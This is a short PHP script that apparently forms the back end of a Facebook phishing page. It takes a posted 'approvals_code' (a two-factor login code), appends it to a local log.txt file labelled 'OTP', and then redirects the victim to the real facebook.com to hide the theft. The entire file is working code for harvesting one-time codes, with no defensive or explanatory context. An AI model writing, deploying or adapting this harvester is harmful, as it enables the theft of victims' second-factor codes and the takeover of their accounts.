
<?php
if (isset($_POST['approvals_code'])) {
    $existingContent = file_get_contents('log.txt');

    $newData = " OTP: " . $_POST['approvals_code'] . "\n";

    file_put_contents("log.txt", $existingContent . $newData);

    header('Location: https://www.facebook.com/');
    exit();
}
?>
